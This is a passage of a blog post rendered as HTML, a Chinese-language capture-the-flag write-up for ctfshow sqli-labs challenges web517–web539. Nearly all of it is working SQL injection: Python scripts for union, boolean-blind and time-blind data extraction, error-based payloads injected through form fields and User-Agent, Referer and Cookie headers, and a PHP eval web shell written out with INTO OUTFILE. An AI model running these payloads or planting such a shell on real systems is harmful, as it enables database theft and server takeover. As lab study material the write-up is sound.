@@ -1,0 +1,1289 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]sqli-labs | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web517
+union注入，使用'闭合
+import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]sqli-labs</h2>
+            <div class="post-date">2024-07-21</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowsqli-labs.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web517">web517</h2>
+<p>union注入，使用<code>'</code>闭合</p>
+<pre><code class="language-py">import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
+    print(flag[0])
+
+
+def send_request(params):
+    url = 'http://7409729e-2d15-40b9-8c92-c96092d2a608.challenge.ctf.show/'
+
+    proxies = {
+        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
+    }
+
+    headers = {
+        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
+    }
+    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)
+
+    return resp.text
+
+params1 = {
+    &quot;id&quot;:&quot;-1' union select 1,2,3-- &quot;
+}
+
+resp = send_request(params1)
+
+# 查看所有数据库名
+params2 = {
+    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
+}
+
+resp = send_request(params2)
+
+# 查看表名
+params3 = {
+    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
+}
+
+resp = send_request(params3)
+
+# 查看列名
+params4 = {
+    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3-- &quot;
+}
+
+resp = send_request(params4)
+
+# 查看flag
+params5 = {
+    &quot;id&quot;:&quot;-1' union select 1,(select group_concat(flag) from ctfshow.flag),3-- &quot;
+}
+
+resp = send_request(params5)
+
+find_flag(resp)
+</code></pre>
+<h2 id="web518">web518</h2>
+<p>布尔注入，不需要闭合</p>
+<pre><code class="language-py">import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
+    print(flag[0])
+
+
+def send_request(params):
+    url = 'http://0023f82a-87bb-4405-9718-f612b60ea29c.challenge.ctf.show/'
+
+    proxies = {
+        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
+    }
+
+    headers = {
+        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
+    }
+    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)
+
+    return resp.text
+
+params1 = {
+    &quot;id&quot;:&quot;-1 union select 1,2,3-- &quot;
+}
+
+resp = send_request(params1)
+
+# 查看所有数据库名
+params2 = {
+    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
+}
+
+resp = send_request(params2)
+
+# 查看表名
+params3 = {
+    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
+}
+
+resp = send_request(params3)
+
+# 查看列名
+params4 = {
+    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagaa'),3-- &quot;
+}
+
+resp = send_request(params4)
+
+# 查看flag
+params5 = {
+    &quot;id&quot;:&quot;-1 union select 1,(select group_concat(flagac) from ctfshow.flagaa),3-- &quot;
+}
+
+resp = send_request(params5)
+
+find_flag(resp)
+</code></pre>
+<h2 id="web519">web519</h2>
+<p>union注入，使用<code>')</code>闭合</p>
+<pre><code class="language-py">import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
+    print(flag[0])
+
+
+def send_request(params):
+    url = 'http://2da78177-bddf-46d6-a6af-1db26a56d066.challenge.ctf.show/'
+
+    proxies = {
+        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
+    }
+
+    headers = {
+        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
+    }
+    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)
+
+    return resp.text
+
+params1 = {
+    &quot;id&quot;:&quot;-1') union select 1,2,3-- &quot;
+}
+
+resp = send_request(params1)
+
+# 查看所有数据库名
+params2 = {
+    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
+}
+
+resp = send_request(params2)
+
+# 查看表名
+params3 = {
+    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
+}
+
+resp = send_request(params3)
+
+# 查看列名
+params4 = {
+    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagaanec'),3-- &quot;
+}
+
+resp = send_request(params4)
+
+# 查看flag
+params5 = {
+    &quot;id&quot;:&quot;-1') union select 1,(select group_concat(flagaca) from ctfshow.flagaanec),3-- &quot;
+}
+
+resp = send_request(params5)
+
+find_flag(resp)
+</code></pre>
+<h2 id="web520">web520</h2>
+<p>union注入，使用<code>&quot;)</code>闭合</p>
+<pre><code class="language-py">import requests
+import re
+
+def find_flag(text):
+    flag = re.findall(&quot;ctfshow{[0-9a-z-]{36}}&quot;,text)
+    print(flag[0])
+
+
+def send_request(params):
+    url = 'http://e1bf823f-4a25-4396-99cb-7ad61e90086d.challenge.ctf.show/'
+
+    proxies = {
+        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
+    }
+
+    headers = {
+        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
+    }
+    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)
+
+    return resp.text
+
+params1 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,2,3-- &quot;
+}
+
+resp = send_request(params1)
+
+# 查看所有数据库名
+params2 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
+}
+
+resp = send_request(params2)
+
+# 查看表名
+params3 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
+}
+
+resp = send_request(params3)
+
+# 查看列名
+params4 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagsf'),3-- &quot;
+}
+
+resp = send_request(params4)
+
+# 查看flag
+params5 = {
+    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(flag23) from ctfshow.flagsf),3-- &quot;
+}
+
+resp = send_request(params5)
+
+find_flag(resp)
+</code></pre>
+<h2 id="web521">web521</h2>
+<p>布尔注入，使用<code>'</code>闭合</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://6f1c2196-49fe-4141-bdbc-7120d82154b3.challenge.ctf.show/?id=1'and &quot;
+
+result = ''
+i = 0
+
+proxies = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)%23'
+        # payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)%23'
+        payload = f'if(ascii(substr((select group_concat(flag33) from ctfshow.flagpuck),{i},1))&gt;{mid},1,0)%23'
+
+        r = requests.get(url + payload,proxies=proxies)
+        if &quot;You are in...........&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web522">web522</h2>
+<p>布尔注入，使用<code>&quot;</code>闭合</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://5adfc251-2ed4-4f73-8de4-287eda414c6e.challenge.ctf.show/?id=1\&quot; and &quot;
+
+result = ''
+i = 0
+
+proxies = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot; ),{i},1))&gt;{mid},1,0)%23'
+        # payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;),{i},1))&gt;{mid},1,0)%23'
+        payload = f'if(ascii(substr((select group_concat(flag3a3) from ctfshow.flagpa),{i},1))&gt;{mid},1,0)%23'
+
+        r = requests.get(url + payload,proxies=proxies)
+        if &quot;You are in...........&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web523">web523</h2>
+<pre><code>?id=1%27))%20union%20select%20NULL,0x3c3f70687020406576616c28245f504f53545b315d293f3e,NULL%20into%20outfile%20&quot;/var/www/html/1.php&quot;%23
+</code></pre>
+<p>使用into outfile写入shell</p>
+<pre><code>&lt;?php @eval($_POST[1])?&gt;
+0x3c3f70687020406576616c28245f504f53545b315d293f3e
+</code></pre>
+<h2 id="web524">web524</h2>
+<p>时间盲注，使用<code>'</code>闭合。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://c2e9c750-261e-41b2-b8eb-f2306b836355.challenge.ctf.show//?id=1%27and%20&quot;
+
+result = ''
+i = 0
+
+proxies = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.5),0)%23'
+        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)%23'
+        payload = f'if(ascii(substr((select/**/group_concat(flag423)from(ctfshow.flagjugg)),{i},1))&gt;{mid},sleep(0.6),0)%23'
+
+
+        try:
+            r = requests.get(url + payload,proxies=proxies, timeout=0.5)
+            tail = mid
+        except:
+            head = mid + 1
+
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web525">web525</h2>
+<p>时间盲注，使用<code>'</code>闭合</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://56ab9933-1353-496e-83ee-3fc733ae8df8.challenge.ctf.show//?id=1%27and%20&quot;
+
+result = ''
+i = 0
+
+proxies = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.5),0)%23'
+        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)%23'
+        payload = f'if(ascii(substr((select/**/group_concat(flag4a23)from(ctfshow.flagug)),{i},1))&gt;{mid},sleep(0.6),0)%23'
+
+
+        try:
+            r = requests.get(url + payload,proxies=proxies, timeout=0.5)
+            tail = mid
+        except:
+            head = mid + 1
+
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web526">web526</h2>
+<p>时间盲注，使用<code>&quot;</code>闭合。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://f2b55919-bcd4-4a5f-bec2-d835aee7be4a.challenge.ctf.show/?id=1\&quot;and%20&quot;
+
+result = ''
+i = 7
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.1),0)%23'
+        payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.1),0)%23'
+        payload = f'if(ascii(substr((select/**/group_concat(flag43s)from(ctfshow.flagugs)),{i},1))&gt;{mid},sleep(1.1),0)%23'
+
+        try:
+            r = requests.get(url + payload,timeout=1)
+            tail = mid
+        except:
+            head = mid + 1
+
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web527">web527</h2>
+<p><code>'</code>闭合</p>
+<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(flag43s) from ctfshow.flagugsd#
+</code></pre>
+<h2 id="web528">web528</h2>
+<p><code>&quot;)</code>闭合</p>
+<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(flag43as
+) from ctfshow.flagugsds#
+</code></pre>
+<h2 id="web529">web529</h2>
+<p><code>')</code>闭合<br>
+没有回显，使用报错注入<code>updatexml</code></p>
+<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),0)#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),0)#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select flag4 from ctfshow.flag)),0)#
+passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag)),0)#
+</code></pre>
+<h2 id="web530">web530</h2>
+<p><code>&quot;</code>闭合<br>
+没有回显，使用报错注入<code>updatexml</code></p>
+<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),0)#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),0)#
+</code></pre>
+<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select flag4s from ctfshow.flagb)),0)#
+passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select right(flag4s,20) from ctfshow.flagb)),0)#
+</code></pre>
+<h2 id="web531">web531</h2>
+<p><code>'</code>闭合<br>
+没有回显及报错信息，使用布尔盲注。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://da743c68-9836-40dd-af7d-2260c9256357.challenge.ctf.show/&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        payload ={
+            &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),{i},1))&gt;{mid},1,0)#&quot;,
+            &quot;passwd&quot;:&quot;123&quot;,
+            &quot;submit&quot;:&quot;Submit&quot;
+        }
+        # payload = 
+
+        r = requests.post(url=url, data=payload,proxies=proxy)
+        if 'flag.jpg' in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web532">web532</h2>
+<p><code>&quot;)</code>闭合<br>
+没有回显及报错信息，使用布尔盲注。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://7e9bdf22-362a-4365-81e7-804e55517648.challenge.ctf.show/&quot;
+
+result = ''
+i = 0
+
+proxy = {
+    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
+}
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        # payload ={
+        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
+        #     &quot;passwd&quot;:&quot;123&quot;,
+        #     &quot;submit&quot;:&quot;Submit&quot;
+        # }
+        payload ={
+            &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagbab),{i},1))&gt;{mid},1,0)#&quot;,
+            &quot;passwd&quot;:&quot;123&quot;,
+            &quot;submit&quot;:&quot;Submit&quot;
+        }
+        # payload = 
+
+        r = requests.post(url=url, data=payload,proxies=proxy)
+        if 'flag.jpg' in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web533">web533</h2>
+<p><code>'</code>闭合，update型报错注入</p>
+<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),0x7e),1)#
+</code></pre>
+<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),0x7e),1)#
+</code></pre>
+<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select flag4 from ctfshow.flag),0x7e),1)#
+</code></pre>
+<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,right((select flag4 from ctfshow.flag),20),0x7e),1)#
+</code></pre>
+<h2 id="web534">web534</h2>
+<p>使用账号admin/admin登录，会显示UA头及IP Referer地址<br>
+UA头注入<br>
+这里无法使用注释符，使用引号闭合后面的引号。</p>
+<p>后端源码：</p>
+<pre><code class="language-php">&lt;?php
+ $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)&quot;;
+mysql_query($insert);
+print_r(mysql_error());	
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
+</code></pre>
+<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
+</code></pre>
+<h2 id="web535">web535</h2>
+<p>使用账号admin/admin登录，会显示IP Referer地址<br>
+Referer头注入<br>
+这里无法使用注释符，使用引号闭合后面的引号。</p>
+<p>后端源码：</p>
+<pre><code class="language-php">&lt;?php
+$uagent = $_SERVER['HTTP_REFERER'];
+$IP = $_SERVER['REMOTE_ADDR'];
+$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')&quot;;
+mysql_query($insert);
+print_r(mysql_error());
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
+</code></pre>
+<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
+</code></pre>
+<h2 id="web536">web536</h2>
+<p>使用账号admin/admin登录，会显示Cookie值<br>
+Cookie头注入</p>
+<p>后台源码：</p>
+<pre><code class="language-php">&lt;?php
+$sql=&quot;SELECT * FROM users WHERE username='$cookee' LIMIT 0,1&quot;;
+			$result=mysql_query($sql);
+			if (!$result)
+  				{
+  				die('Issue with your mysql: ' . mysql_error());
+  				}
+</code></pre>
+<pre><code>Cookie: uname='and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1)#
+</code></pre>
+<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1)#
+</code></pre>
+<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1)#
+</code></pre>
+<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1)#
+</code></pre>
+<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1)#
+</code></pre>
+<h2 id="web537">web537</h2>
+<p><code>')</code>闭合<br>
+使用账号admin/admin登录，会显示base64编码的Cookie值<br>
+Cookie头注入</p>
+<p>后端源码：</p>
+<pre><code class="language-php">&lt;?php&gt;
+$cookee = base64_decode($cookee);
+echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;
+$sql=&quot;SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+if (!$result)
+    {
+    die('Issue with your mysql: ' . mysql_error());
+    }
+
+</code></pre>
+<pre><code>Cookie: uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhKSksMSkj
+</code></pre>
+<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0iY3Rmc2hvdyIpKSwxKSM=
+</code></pre>
+<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPSJjdGZzaG93IikpLDEpIw==
+</code></pre>
+<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZzQpIGZyb20gY3Rmc2hvdy5mbGFnKSksMSkj
+</code></pre>
+<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCByaWdodChmbGFnNCwyMCkgZnJvbSBjdGZzaG93LmZsYWcpKSwxKSM=
+</code></pre>
+<h2 id="web538">web538</h2>
+<p><code>&quot;</code>闭合，其他和上题相同</p>
+<pre><code>Cookie: uname=ImFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHgzZCwoc2VsZWN0IHJpZ2h0KGZsYWc0LDIwKSBmcm9tIGN0ZnNob3cuZmxhZykpLDEpIw==
+</code></pre>
+<pre><code>Cookie: uname=ImFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHgzZCwoc2VsZWN0IGdyb3VwX2NvbmNhdChmbGFnNCkgZnJvbSBjdGZzaG93LmZsYWcpKSwxKSM=
+</code></pre>
+<h2 id="web539">web539</h2>
+<p>过滤了注释符的报错注入。</p>
+<p>后端源码：</p>
+<pre><code class="language-php">&lt;?php
+$reg = &quot;/#/&quot;;
+$reg1 = &quot;/--/&quot;;
+$replace = &quot;&quot;;
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id)
+
+$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+	if($row)
+	{
+  	echo '&lt;font color= &quot;#0000ff&quot;&gt;';	
+  	echo 'Your Login name:'. $row['username'];
+  	echo &quot;&lt;br&gt;&quot;;
+  	echo 'Your Password:' .$row['password'];
+  	echo &quot;&lt;/font&gt;&quot;;
+  	}
+	else 
+	{
+	echo '&lt;font color= &quot;#FFFF00&quot;&gt;';
+	print_r(mysql_error());
+	echo &quot;&lt;/font&gt;&quot;;  
+	}
+}
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
+</code></pre>
+<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
